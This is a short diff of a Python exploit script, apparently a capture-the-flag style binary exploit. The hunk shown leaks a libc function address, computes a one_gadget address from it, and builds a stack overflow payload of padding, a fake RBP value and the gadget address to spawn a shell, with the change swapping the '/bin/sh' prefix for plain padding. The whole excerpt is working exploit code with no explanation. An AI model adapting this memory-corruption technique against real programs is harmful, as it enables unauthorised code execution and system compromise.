@@ -483,11 +483,10 @@ if __name__=='__main__':
     leak = struct.unpack('Q', raw.ljust(8, b'\x00'))[0]     ## LEAK fclose addr
     print('[+] Leaked fread addr: %s' % hex(leak))
 
-    one_gadget = leak - diff_offset                         ## Calculate real addr for sh
+    one_gadget = leak - diff_offset                           ## Calculate real addr for sh
     print('[+] one_gadget should be at: %s' % hex(one_gadget))
 
-    payload  = b'/bin/sh\x00'
-    payload += b'B'*(64 - len(payload))
+    payload  = b'B' * 64
     payload += struct.pack('Q', 0x42424242)                 ## RBP on .got
     payload += struct.pack('Q', one_gadget)                 ## one_gadget
 
